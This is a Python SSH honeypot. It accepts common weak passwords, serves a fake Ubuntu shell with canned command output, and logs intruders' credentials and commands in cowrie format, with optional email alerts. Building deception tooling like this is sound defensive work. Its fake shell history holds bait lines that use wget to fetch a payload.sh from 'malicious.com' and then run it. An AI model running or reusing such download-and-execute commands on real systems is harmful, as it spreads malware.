"""
Python SSH Honeypot -- Attacker Trap
Captures: IP, Port, Username, Password, Commands, Session Time
Logs to cowrie.json format (compatible with existing dashboard)
"""

import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

import socket
import threading
import paramiko
import json
import os
import time
import logging
import smtplib
import traceback
from datetime import datetime, timezone
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pathlib import Path
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# ──────────────────────────────────────────────────────────────────
#  CONFIGURATION — Edit these values before running
# ──────────────────────────────────────────────────────────────────
CONFIG = {
    # SSH server settings
    "HOST":             "0.0.0.0",           # Listen on all interfaces
    "PORT":             2222,                 # Port to listen on (use 22 if running as root/admin)
    "MAX_CONNECTIONS":  100,                  # Max concurrent connections

    # Log file (appended to your existing cowrie.json pipeline)
    "LOG_FILE":         "cowrie.json",

    # RSA host key file (auto-generated if missing)
    "HOST_KEY_FILE":    "honeypot_host.key",

    # ── Email alert settings (fill in to receive real-time alerts) ─
    "ALERT_EMAIL": {
        "enabled":   False,                  # Set True to enable email alerts
        "smtp_host": "smtp.gmail.com",
        "smtp_port": 587,
        "sender":    "your_email@gmail.com", # Your Gmail address
        "password":  "your_app_password",    # Gmail App Password (not account password)
        "recipient": "owner@example.com",    # Where alerts are sent
    },

    # Fake system banner shown during SSH negotiation
    "BANNER":    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6",

    # Accepted credential pairs  (username → list of accepted passwords)
    # Attackers who try ANY of these will be "let in"
    "ACCEPTED_CREDENTIALS": {
        "root":       ["root", "toor", "password", "123456", "admin", "1234", "pass", ""],
        "admin":      ["admin", "admin123", "password", "123456", "1234", "admin@123", ""],
        "user":       ["user", "user123", "password", ""],
        "ubuntu":     ["ubuntu", "ubuntu123", "password", ""],
        "pi":         ["pi", "raspberry", "raspberrypi", ""],
        "oracle":     ["oracle", "oracle123", "password", ""],
        "guest":      ["guest", "guest123", ""],
        "test":       ["test", "test123", ""],
        "support":    ["support", "support123", ""],
        "postgres":   ["postgres", "postgres123", ""],
        "mysql":      ["mysql", "mysql123", ""],
        "ftp":        ["ftp", "ftp123", ""],
        "www-data":   ["www-data", "www", ""],
        "deploy":     ["deploy", "deploy123", ""],
        "ec2-user":   ["ec2-user", ""],
    },
}

# ──────────────────────────────────────────────────────────────────
#  Fake Linux Shell responses
# ──────────────────────────────────────────────────────────────────
FAKE_FILESYSTEM = {
    "/":        ["bin", "dev", "etc", "home", "lib", "proc", "root", "tmp", "usr", "var"],
    "/root":    [".bashrc", ".ssh", "secret.txt", ".bash_history"],
    "/etc":     ["passwd", "shadow", "hostname", "hosts", "crontab"],
    "/tmp":     [],
    "/home":    ["admin", "ubuntu"],
    "/var":     ["log", "www"],
    "/var/log": ["auth.log", "syslog", "kern.log"],
    "/usr":     ["bin", "lib", "local", "share"],
}

FAKE_RESPONSES = {
    "uname -a":         "Linux ubuntu-server 5.15.0-97-generic #107-Ubuntu SMP Wed Feb 7 13:26:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux",
    "uname":            "Linux",
    "whoami":           None,           # Will be replaced by actual session username
    "id":               None,           # Will be replaced by actual session username
    "hostname":         "ubuntu-server",
    "pwd":              "/root",
    "uptime":           " 10:14:22 up 47 days,  3:22,  1 user,  load average: 0.08, 0.03, 0.01",
    "w":                " 10:14:22 up 47 days,  3:22,  1 user,  load average: 0.08, 0.03, 0.01\nUSER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT",
    "cat /etc/hostname": "ubuntu-server",
    "cat /etc/passwd":  "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nadmin:x:1000:1000:,,,:/home/admin:/bin/bash\nubuntu:x:1001:1001:,,,:/home/ubuntu:/bin/bash",
    "cat /etc/shadow":  "cat: /etc/shadow: Permission denied",
    "ls /":             " ".join(["bin", "dev", "etc", "home", "lib", "proc", "root", "tmp", "usr", "var"]),
    "ls":               ".bashrc  .ssh  secret.txt  .bash_history",
    "ls -la":           "total 32\ndrwx------  5 root root 4096 Apr 14 09:33 .\ndrwxr-xr-x 22 root root 4096 Jan 12 18:22 ..\n-rw-r--r--  1 root root 3526 Jan 12 18:22 .bashrc\ndrwx------  2 root root 4096 Apr 11 17:45 .ssh\n-rw-------  1 root root  220 Jan 12 18:22 .bash_history\n-rw-r--r--  1 root root   72 Apr 14 09:33 secret.txt",
    "ls -l":            "-rw-r--r-- 1 root root 3526 .bashrc\ndrwx------ 2 root root 4096 .ssh\n-rw-r--r-- 1 root root   72 secret.txt",
    "cat secret.txt":   "# Top Secret\ndb_password=Sup3rS3cure!\napi_key=FAKE-KEY-0xDEADBEEF",
    "cat .bash_history":"wget http://malicious.com/payload.sh\nchmod +x payload.sh\n./payload.sh\ncrontab -e",
    "ifconfig":         "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.0.5  netmask 255.255.255.0  broadcast 10.0.0.255\n        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0",
    "ip a":             "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0",
    "ps aux":           "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1  37400  5680 ?        Ss   09:22   0:01 /sbin/init\nroot       420  0.0  0.0  15872  1664 ?        Ss   09:22   0:00 sshd",
    "ps":               "  PID TTY          TIME CMD\n 1234 pts/0    00:00:00 bash\n 5678 pts/0    00:00:00 ps",
    "netstat -an":      "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN",
    "env":              "SHELL=/bin/bash\nTERM=xterm-256color\nUSER=root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/root\nLANG=en_US.UTF-8",
    "history":          "    1  uname -a\n    2  ls -la\n    3  cat /etc/passwd\n    4  wget http://malicious.com/payload.sh\n    5  chmod +x payload.sh",
    "df -h":            "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        20G  8.5G   11G  45% /\ntmpfs           2.0G     0  2.0G   0% /dev/shm",
    "free -h":          "              total        used        free      shared  buff/cache   available\nMem:           3.8G        512M        2.9G         12M        419M        3.1G\nSwap:          1.0G          0B        1.0G",
    "top":              "top - 10:14:22 up 47 days,  3:22,  1 user,  load average: 0.08\nTasks: 112 total,   1 running, 111 sleeping,   0 stopped\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.5 id\nMiB Mem :   3800.0 total,   2900.0 free,    512.0 used\n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0   37400   5680   4960 S   0.0   0.1   0:01.23 systemd",
    "crontab -l":       "# Edit this file to introduce tasks to be run by cron.\n#\n*/5 * * * * /usr/bin/backup.sh",
    "date":             None,           # Will return real current date
    "clear":            "",
    "exit":             None,           # Will trigger disconnect
    "logout":           None,           # Will trigger disconnect
    "sudo su":          "[sudo] password for user: \nSorry, try again.",
    "sudo -l":          "Sorry, user may not run sudo on this server.",
    "python3 --version":"Python 3.10.12",
    "python --version": "Python 2.7.18",
    "perl --version":   "This is perl 5, version 34 (v5.34.0)",
    "curl":             "curl: try 'curl --help' for more information",
    "wget":             "wget: missing URL",
    "which wget":       "/usr/bin/wget",
    "which curl":       "/usr/bin/curl",
    "which python3":    "/usr/bin/python3",
    "echo $PATH":       "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "cat /proc/version":"Linux version 5.15.0-97-generic (buildd@lcy02-amd64-029) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0) #107-Ubuntu SMP Wed Feb 7 13:26:48 UTC 2024",
    "lscpu":            "Architecture:            x86_64\n  CPU op-mode(s):        32-bit, 64-bit\nCPU(s):                  2\nOn-line CPU(s) list:     0,1\nModel name:              Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz",
    "mount":             "sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\nproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\n/dev/sda1 on / type ext4 (rw,relatime)",
}

# MOTD shown after successful login
MOTD = """\r
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)\r
\r
 * Documentation:  https://help.ubuntu.com\r
 * Management:     https://landscape.canonical.com\r
 * Support:        https://ubuntu.com/pro\r
\r
 System information as of {date}\r
\r
  System load:  0.08              Processes:             112\r
  Usage of /:   45.0% of 19.57GB Users logged in:       0\r
  Memory usage: 13%               IPv4 address for eth0: 10.0.0.5\r
\r
Last login: Wed Apr 10 14:23:11 2024 from 203.0.113.42\r
"""

# ──────────────────────────────────────────────────────────────────
#  Logging setup
# ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("honeypot.log", encoding="utf-8"),
        logging.StreamHandler(),
    ]
)
logger = logging.getLogger("SSHHoneypot")

# JSON log lock (thread-safe writes)
_log_lock = threading.Lock()


def log_event(event: dict):
    """Append a JSON event line to cowrie.json (same format as existing pipeline)."""
    event.setdefault("timestamp", datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z")
    line = json.dumps(event)
    with _log_lock:
        with open(CONFIG["LOG_FILE"], "a", encoding="utf-8") as f:
            f.write(line + "\n")
    logger.info("[EVENT] %s | IP=%-16s | %s", event.get("eventid"), event.get("src_ip"), event.get("username", ""))


# ──────────────────────────────────────────────────────────────────
#  Email alert
# ──────────────────────────────────────────────────────────────────
def send_alert(attacker_ip: str, port: int, username: str, password: str):
    cfg = CONFIG["ALERT_EMAIL"]
    if not cfg["enabled"]:
        return

    try:
        subject = f"🚨 SSH Honeypot Alert — Login from {attacker_ip}"
        body = f"""
SSH Honeypot has caught an intruder!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Attacker IP  : {attacker_ip}
  Port         : {port}
  Username     : {username}
  Password     : {password}
  Time (UTC)   : {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Action: Attacker was given a fake shell. All commands are being logged.
        """
        msg = MIMEMultipart()
        msg["From"]    = cfg["sender"]
        msg["To"]      = cfg["recipient"]
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain"))

        with smtplib.SMTP(cfg["smtp_host"], cfg["smtp_port"]) as server:
            server.ehlo()
            server.starttls()
            server.login(cfg["sender"], cfg["password"])
            server.sendmail(cfg["sender"], cfg["recipient"], msg.as_string())

        logger.info("[ALERT] Email sent to %s", cfg["recipient"])
    except Exception as e:
        logger.warning("[ALERT] Email failed: %s", e)


# ──────────────────────────────────────────────────────────────────
#  RSA Host Key (auto-generate if missing)
# ──────────────────────────────────────────────────────────────────
def get_host_key() -> paramiko.RSAKey:
    key_path = CONFIG["HOST_KEY_FILE"]
    if not os.path.exists(key_path):
        logger.info("Generating new RSA host key → %s", key_path)
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        with open(key_path, "wb") as f:
            f.write(pem)
        logger.info("Host key saved.")
    return paramiko.RSAKey(filename=key_path)


# ──────────────────────────────────────────────────────────────────
#  SSH Server Interface (paramiko)
# ──────────────────────────────────────────────────────────────────
class HoneypotServer(paramiko.ServerInterface):
    def __init__(self, client_ip: str, client_port: int):
        self.ip          = client_ip
        self.port        = client_port
        self.username    = ""
        self.password    = ""
        self.event       = threading.Event()

    # ── Connection ────────────────────────────────────────────────
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_exec_request(self, channel, command):
        self.event.set()
        return True

    # ── Authentication ────────────────────────────────────────────
    def check_auth_password(self, username: str, password: str) -> int:
        accepted = CONFIG["ACCEPTED_CREDENTIALS"]
        ts       = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        base_event = {
            "src_ip":   self.ip,
            "src_port": self.port,
            "username": username,
            "password": password,
            "session":  f"s{int(time.time()*1000) % 10000:04d}",
        }

        if username in accepted and password in accepted[username]:
            self.username = username
            self.password = password
            log_event({**base_event, "eventid": "cowrie.login.success", "timestamp": ts})
            logger.warning("✅ LOGIN SUCCESS  IP=%-16s  user=%-12s  pass=%s", self.ip, username, password)
            threading.Thread(target=send_alert, args=(self.ip, self.port, username, password), daemon=True).start()
            return paramiko.AUTH_SUCCESSFUL
        else:
            log_event({**base_event, "eventid": "cowrie.login.failed", "timestamp": ts})
            logger.info("❌ LOGIN FAILED   IP=%-16s  user=%-12s  pass=%s", self.ip, username, password)
            return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "password"


# ──────────────────────────────────────────────────────────────────
#  Fake Shell
# ──────────────────────────────────────────────────────────────────
def fake_shell(channel, username: str, client_ip: str, client_port: int):
    """Runs an interactive fake Linux shell for the attacker."""
    session_id = f"s{int(time.time()*1000) % 10000:04d}"
    cwd        = "/root" if username == "root" else f"/home/{username}"

    # Send MOTD
    motd = MOTD.format(date=datetime.now().strftime("%a %b %d %H:%M:%S %Z %Y"))
    channel.send(motd.encode())

    prompt = f"root@ubuntu-server:~# " if username == "root" else f"{username}@ubuntu-server:~$ "
    channel.send(prompt.encode())

    buf = ""
    try:
        while True:
            data = channel.recv(1024)
            if not data:
                break

            # Handle special characters
            for byte in data:
                char = chr(byte)

                if char in ("\r", "\n"):
                    channel.send(b"\r\n")
                    cmd = buf.strip()
                    buf = ""

                    if not cmd:
                        channel.send(prompt.encode())
                        continue

                    # ── Log every command ──────────────────────────
                    log_event({
                        "eventid":   "cowrie.command.input",
                        "src_ip":    client_ip,
                        "src_port":  client_port,
                        "session":   session_id,
                        "username":  username,
                        "input":     cmd,
                        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                    })
                    logger.info("💻 COMMAND        IP=%-16s  user=%-12s  cmd=%s", client_ip, username, cmd)

                    # ── Handle exit / logout ───────────────────────
                    if cmd in ("exit", "logout", "quit"):
                        channel.send(b"logout\r\n")
                        break

                    # ── Resolve response ───────────────────────────
                    response = resolve_command(cmd, username, cwd)
                    if response:
                        channel.send((response + "\r\n").encode(errors="replace"))

                    channel.send(prompt.encode())

                elif byte == 127 or byte == 8:   # Backspace / DEL
                    if buf:
                        buf = buf[:-1]
                        channel.send(b"\x08 \x08")
                elif byte == 3:                   # Ctrl-C
                    buf = ""
                    channel.send(b"^C\r\n")
                    channel.send(prompt.encode())
                elif byte == 4:                   # Ctrl-D (EOF)
                    channel.send(b"logout\r\n")
                    break
                else:
                    buf += char
                    channel.send(char.encode(errors="replace"))

    except Exception as e:
        logger.debug("Shell error: %s", e)

    log_event({
        "eventid":   "cowrie.session.closed",
        "src_ip":    client_ip,
        "src_port":  client_port,
        "session":   session_id,
        "username":  username,
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
    })
    logger.info("🔌 SESSION CLOSED IP=%-16s  user=%s", client_ip, username)
    channel.close()


def resolve_command(cmd: str, username: str, cwd: str) -> str:
    """Return a fake response for a given shell command."""
    # Exact match first
    if cmd in FAKE_RESPONSES:
        val = FAKE_RESPONSES[cmd]
        if val is None:
            if cmd in ("exit", "logout"):
                return ""
            if "whoami" in cmd:
                return username
            if "id" in cmd:
                uid = 0 if username == "root" else 1000
                return f"uid={uid}({username}) gid={uid}({username}) groups={uid}({username})"
            if "date" in cmd:
                return datetime.now().strftime("%a %b %d %H:%M:%S %Z %Y")
        return val if val is not None else ""

    # Dynamic handling
    lc = cmd.lower()

    if lc.startswith("echo "):
        return cmd[5:].strip().strip('"').strip("'")

    if lc.startswith("cd "):
        return ""   # Pretend cd works silently

    if lc.startswith("ls"):
        return "bin  boot  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var"

    if lc.startswith("cat "):
        filename = cmd[4:].strip()
        return f"cat: {filename}: No such file or directory"

    if lc.startswith("ping "):
        target = cmd.split()[-1]
        return f"PING {target} ({target}): 56 data bytes\n--- {target} ping statistics ---\n4 packets transmitted, 0 received, 100% packet loss"

    if lc.startswith("wget ") or lc.startswith("curl "):
        return "--2024-04-14 10:14:22--  \nConnecting... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 4096 (4.0K) [application/octet-stream]\nSaving to: 'payload.sh'\npayload.sh: Permission denied"

    if lc.startswith("chmod"):
        return ""

    if lc.startswith("./") or lc.startswith("bash ") or lc.startswith("sh "):
        return "bash: permission denied"

    if lc.startswith("sudo "):
        return f"[sudo] password for {username}: \nSorry, user {username} may not run sudo on ubuntu-server."

    if "python" in lc and "-c" in lc:
        return ""   # swallow python one-liners silently

    if lc.startswith("apt") or lc.startswith("yum") or lc.startswith("dnf"):
        return "E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)"

    if lc.startswith("kill") or lc.startswith("pkill"):
        return ""

    if lc.startswith("rm ") or lc == "rm":
        return "rm: cannot remove: Permission denied"

    if lc.startswith("mkdir"):
        return ""

    if cmd in ("bash", "sh", "/bin/bash", "/bin/sh"):
        return ""   # silently accept, stay in same fake shell

    # Fallback
    return f"bash: {cmd.split()[0]}: command not found"


# ──────────────────────────────────────────────────────────────────
#  Client handler (one per connection)
# ──────────────────────────────────────────────────────────────────
def handle_client(client_socket: socket.socket, client_addr: tuple):
    client_ip, client_port = client_addr
    session_id = f"s{int(time.time()*1000) % 10000:04d}"

    log_event({
        "eventid":   "cowrie.session.connect",
        "src_ip":    client_ip,
        "src_port":  client_port,
        "session":   session_id,
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
    })
    logger.info("🔗 CONNECTION     IP=%-16s  port=%d", client_ip, client_port)

    transport = None
    try:
        transport = paramiko.Transport(client_socket)
        transport.local_version = CONFIG["BANNER"]
        transport.add_server_key(HOST_KEY)

        server = HoneypotServer(client_ip, client_port)
        transport.start_server(server=server)

        # Wait for a channel to open (up to 30 s)
        channel = transport.accept(30)
        if channel is None:
            logger.info("No channel opened by %s", client_ip)
            return

        # Wait for shell request (up to 10 s)
        server.event.wait(10)

        fake_shell(channel, server.username or "root", client_ip, client_port)

    except paramiko.SSHException as e:
        logger.debug("SSH error from %s: %s", client_ip, e)
    except EOFError:
        logger.debug("EOF from %s", client_ip)
    except Exception as e:
        logger.debug("Unexpected error from %s: %s", client_ip, traceback.format_exc())
    finally:
        try:
            if transport:
                transport.close()
            client_socket.close()
        except Exception:
            pass


# ──────────────────────────────────────────────────────────────────
#  Main server loop
# ──────────────────────────────────────────────────────────────────
HOST_KEY = None   # loaded in main()


def start_server():
    global HOST_KEY
    HOST_KEY = get_host_key()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((CONFIG["HOST"], CONFIG["PORT"]))
    except PermissionError:
        logger.error("Permission denied on port %d. Try a port > 1024 or run as Administrator.", CONFIG["PORT"])
        return
    except OSError as e:
        logger.error("Cannot bind: %s", e)
        return

    server_socket.listen(CONFIG["MAX_CONNECTIONS"])

    banner = f"""
+----------------------------------------------------------+
|           [SSH HONEYPOT RUNNING]                         |
+----------------------------------------------------------+
|  Listening  : {CONFIG['HOST']}:{CONFIG['PORT']:<43}|
|  Log File   : {CONFIG['LOG_FILE']:<43}|
|  Key File   : {CONFIG['HOST_KEY_FILE']:<43}|
|  Alert Email: {'ENABLED' if CONFIG['ALERT_EMAIL']['enabled'] else 'DISABLED':<43}|
+----------------------------------------------------------+
|  Press Ctrl+C to stop                                    |
+----------------------------------------------------------+
"""
    print(banner)
    logger.info("SSH Honeypot started on %s:%d", CONFIG["HOST"], CONFIG["PORT"])

    try:
        while True:
            client_socket, client_addr = server_socket.accept()
            t = threading.Thread(
                target=handle_client,
                args=(client_socket, client_addr),
                daemon=True
            )
            t.start()
    except KeyboardInterrupt:
        logger.info("Honeypot stopped by user.")
    finally:
        server_socket.close()


if __name__ == "__main__":
    start_server()
